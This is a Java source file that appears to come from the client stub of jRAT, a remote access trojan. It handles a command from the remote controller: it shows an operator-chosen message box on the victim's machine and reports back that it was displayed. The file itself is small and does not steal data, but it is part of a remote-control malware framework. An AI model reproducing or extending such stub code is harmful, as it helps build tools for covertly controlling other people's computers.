package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.Constants;

import javax.swing.JOptionPane;
import javax.swing.UIManager;


public class Packet10Messagebox extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		boolean theme = Connection.readBoolean();

		if (theme) {
			UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
		}

		final int mode = Connection.readInt();
		final String title = Connection.readLine();
		final String message = Connection.readLine();

		new Thread() {
			public void run() {
				Connection.status(Constants.STATUS_DISPLAYED_MSGBOX);
				JOptionPane.showMessageDialog(null, message, title, mode);
			}
		}.start();
	}

}